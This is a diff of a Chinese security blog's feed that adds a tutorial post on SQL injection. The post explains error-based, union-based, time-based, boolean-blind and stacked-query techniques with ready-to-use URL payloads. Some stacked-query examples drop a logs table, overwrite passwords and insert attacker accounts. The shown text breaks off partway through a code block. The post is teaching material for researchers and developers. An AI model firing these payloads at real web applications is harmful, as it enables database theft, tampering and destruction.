@@ -3,12 +3,18 @@
     <id>https://bae-ace.github.io</id>
     <title>bae的博客</title>
     <link href="https://bae-ace.github.io" />
-    <updated>2025-07-22T12:41:04.000Z</updated>
+    <updated>2025-07-23T23:51:59.000Z</updated>
     <category term="PWN" />
     <category term="ELF" />
     <category term="ROP" />
     <category term="CTF" />
     <category term="二进制安全" />
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="渗透测试" />
+    <category term="Web安全" />
+    <category term="SQL注入" />
+    <category term="网络安全" />
     <category term="hexo" />
     <category term="博客搭建" />
     <category term="初始测试" />
@@ -16,9 +22,197 @@
     <category term="命令" />
     <category term="信息收集" />
     <category term="子域名" />
-    <category term="渗透测试" />
-    <category term="工具" />
-    <category term="sqlmap" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/</id>
+        <title>SQL注入攻击详解</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/"/>
+        <content type="html">&lt;h1 id=&#34;SQL注入攻击详解&#34;&gt;&lt;a href=&#34;#SQL注入攻击详解&#34; class=&#34;headerlink&#34; title=&#34;SQL注入攻击详解&#34;&gt;&lt;/a&gt;SQL注入攻击详解&lt;/h1&gt;&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;SQL注入作为Web应用程序中最常见的安全漏洞之一，至今仍是攻击者利用的主要手段。本文将详细讲解SQL注入的各种利用方式，帮助安全研究人员和开发者深入理解这一经典漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;什么是SQL注入？&#34;&gt;&lt;a href=&#34;#什么是SQL注入？&#34; class=&#34;headerlink&#34; title=&#34;什么是SQL注入？&#34;&gt;&lt;/a&gt;什么是SQL注入？&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SQL注入（SQL Injection）&lt;/strong&gt; 是一种将恶意SQL语句插入原本正常查询中的攻击方式。攻击者通过在用户输入中注入特殊的SQL代码，可以控制数据库的查询逻辑，进而读取、修改甚至执行系统命令。&lt;/p&gt;
+&lt;h3 id=&#34;攻击原理&#34;&gt;&lt;a href=&#34;#攻击原理&#34; class=&#34;headerlink&#34; title=&#34;攻击原理&#34;&gt;&lt;/a&gt;攻击原理&lt;/h3&gt;&lt;p&gt;当Web应用程序未对用户输入进行充分验证和过滤时，攻击者提交的恶意输入会被直接拼接到SQL查询语句中，导致原有的查询逻辑被改变。&lt;/p&gt;
+&lt;h2 id=&#34;SQL注入类型详解&#34;&gt;&lt;a href=&#34;#SQL注入类型详解&#34; class=&#34;headerlink&#34; title=&#34;SQL注入类型详解&#34;&gt;&lt;/a&gt;SQL注入类型详解&lt;/h2&gt;&lt;h3 id=&#34;1-错误注入（Error-based-Injection）&#34;&gt;&lt;a href=&#34;#1-错误注入（Error-based-Injection）&#34; class=&#34;headerlink&#34; title=&#34;1. 错误注入（Error-based Injection）&#34;&gt;&lt;/a&gt;1. 错误注入（Error-based Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：通过注入有语法错误或运行错误的SQL语句，使数据库抛出报错信息，从错误信息中提取字段、表名、数据库版本等敏感信息。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;核心关键字&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;extractvalue()&lt;/code&gt; - XML路径提取函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;updatexml()&lt;/code&gt; - XML更新函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;floor(rand(0)*2)&lt;/code&gt; - 随机数取整函数&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;group by&lt;/code&gt; - 分组查询&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;经典payload示例&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; extractvalue(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(), &lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;))&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; updatexml(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, concat(&lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;, &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(), &lt;span class=&#34;hljs-number&#34;&gt;0x7e&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;group&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; concat(version(), floor(rand(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;)) &lt;span class=&#34;hljs-keyword&#34;&gt;having&lt;/span&gt; min(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;技术细节&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;extractvalue()&lt;/code&gt;函数在参数格式错误时会抛出详细的错误信息&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;0x7e&lt;/code&gt;代表波浪号&lt;code&gt;~&lt;/code&gt;，用作数据分隔符便于识别&lt;/li&gt;
+&lt;li&gt;通过构造特定的错误条件，可以在报错中泄露数据库敏感信息&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-联合查询注入（Union-based-Injection）&#34;&gt;&lt;a href=&#34;#2-联合查询注入（Union-based-Injection）&#34; class=&#34;headerlink&#34; title=&#34;2. 联合查询注入（Union-based Injection）&#34;&gt;&lt;/a&gt;2. 联合查询注入（Union-based Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：通过&lt;code&gt;union select&lt;/code&gt;语句将攻击者指定的查询结果与原始查询结果合并，从而在页面上直接显示数据库中的敏感数据。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;核心关键字&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;union select&lt;/code&gt; - 联合查询&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;null&lt;/code&gt; - 空值占位符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;order by&lt;/code&gt; - 字段排序（用于探测列数）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;from dual&lt;/code&gt; - Oracle数据库虚拟表&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;探测与利用流程&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;确定字段数量&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight applescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?&lt;span class=&#34;hljs-built_in&#34;&gt;id&lt;/span&gt;=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; order &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;构造联合查询&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),version() &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;提取敏感数据&lt;/strong&gt;：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-built_in&#34;&gt;table_name&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.&lt;span class=&#34;hljs-keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-built_in&#34;&gt;column_name&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt;,&lt;span class=&#34;hljs-keyword&#34;&gt;null&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.&lt;span class=&#34;hljs-keyword&#34;&gt;columns&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;table_name&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;3-时间延时注入（Time-based-Injection）&#34;&gt;&lt;a href=&#34;#3-时间延时注入（Time-based-Injection）&#34; class=&#34;headerlink&#34; title=&#34;3. 时间延时注入（Time-based Injection）&#34;&gt;&lt;/a&gt;3. 时间延时注入（Time-based Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：通过执行数据库延时函数，根据HTTP响应时间判断注入条件的真假。这种方法特别适用于无页面回显的盲注场景。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;不同数据库的延时函数&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;: &lt;code&gt;sleep(x)&lt;/code&gt;, &lt;code&gt;benchmark(count, expr)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;: &lt;code&gt;pg_sleep(x)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Oracle&lt;/strong&gt;: &lt;code&gt;dbms_pipe.receive_message(&amp;#39;&amp;#39;,x)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQL Server&lt;/strong&gt;: &lt;code&gt;waitfor delay &amp;#39;00:00:0x&amp;#39;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;典型payload&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; sleep(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt;, benchmark(&lt;span class=&#34;hljs-number&#34;&gt;5000000&lt;/span&gt;,md5(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;test&amp;#x27;&lt;/span&gt;)), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;盲注自动化技巧&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# 逐位判断数据库名&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))&amp;gt;&lt;span class=&#34;hljs-number&#34;&gt;97&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))&amp;lt;&lt;span class=&#34;hljs-number&#34;&gt;122&lt;/span&gt;, sleep(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;4-布尔盲注（Boolean-based-Blind-Injection）&#34;&gt;&lt;a href=&#34;#4-布尔盲注（Boolean-based-Blind-Injection）&#34; class=&#34;headerlink&#34; title=&#34;4. 布尔盲注（Boolean-based Blind Injection）&#34;&gt;&lt;/a&gt;4. 布尔盲注（Boolean-based Blind Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：通过构造布尔表达式，根据页面返回内容的差异来推测数据库信息。当条件为真时页面正常显示，条件为假时页面异常或内容发生变化。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;核心函数与技巧&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;substr(str, pos, len)&lt;/code&gt; - 字符串截取&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ascii(char)&lt;/code&gt; - 字符转ASCII码&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;length(str)&lt;/code&gt; - 字符串长度&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;like&lt;/code&gt; - 模糊匹配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;实战示例&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;# 判断数据库名长度&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; length(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;())=&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 逐位爆破数据库名&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;115&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--  # &amp;#x27;s&amp;#x27;&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(substr(&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;(),&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&lt;span class=&#34;hljs-number&#34;&gt;101&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--  # &amp;#x27;e&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;# 使用&lt;span class=&#34;hljs-keyword&#34;&gt;like&lt;/span&gt;进行模糊匹配&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;like&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;sec%&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;5-堆叠查询注入（Stacked-Query-Injection）&#34;&gt;&lt;a href=&#34;#5-堆叠查询注入（Stacked-Query-Injection）&#34; class=&#34;headerlink&#34; title=&#34;5. 堆叠查询注入（Stacked Query Injection）&#34;&gt;&lt;/a&gt;5. 堆叠查询注入（Stacked Query Injection）&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;攻击原理&lt;/strong&gt;：当数据库和Web应用支持在一次请求中执行多条SQL语句时，攻击者可以使用分号&lt;code&gt;;&lt;/code&gt;分隔多条语句，实现更复杂的攻击操作。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;支持情况&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;MySQL&lt;/strong&gt;: 需要使用&lt;code&gt;multi_query()&lt;/code&gt;函数，默认不支持&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SQL Server&lt;/strong&gt;: 默认支持&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;PostgreSQL&lt;/strong&gt;: 支持&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Oracle&lt;/strong&gt;: 不支持&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;危险操作示例&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight pgsql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;insert&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;into&lt;/span&gt; users(username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;values&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hacker&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;) &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;table&lt;/span&gt; logs &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;update&lt;/span&gt; users &lt;span class=&#34;hljs-keyword&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;hacked&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;--&lt;/span&gt;&lt;br&gt;?id=&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;; &lt;span class=&#34;hljs-keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;user&lt;/span&gt; hacker identified &lt;span class=&#34;hljs-keyword&#34;&gt;by&lt;/span&gt; &lt;span 